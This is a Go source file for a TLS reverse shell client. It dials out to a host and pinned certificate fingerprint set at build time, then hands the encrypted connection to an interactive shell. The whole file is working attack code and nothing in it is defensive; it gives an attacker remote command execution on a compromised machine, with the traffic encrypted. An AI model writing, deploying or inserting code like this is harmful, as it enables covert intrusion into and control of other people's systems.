package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"net"
	"os"
	"strings"

	"./shell"
)

const (
	ERR_COULD_NOT_DECODE = 1 << iota
	ERR_HOST_UNREACHABLE = iota
	ERR_BAD_FINGERPRINT  = iota
)

var (
	connectString string
	fingerPrint   string
)

func RunShell(conn net.Conn) {
	shell.InteractiveShell(conn)
	//var cmd *exec.Cmd = shell.GetShell()
	//cmd.Stdout = conn
	//cmd.Stderr = conn
	//cmd.Stdin = conn
	//cmd.Run()
}

func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

func Reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(ERR_HOST_UNREACHABLE)
	}

	defer conn.Close()

	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
		os.Exit(ERR_BAD_FINGERPRINT)
	}
	RunShell(conn)
}

func main() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ERR_COULD_NOT_DECODE)
		}
		Reverse(connectString, bytesFingerprint)
	}
}
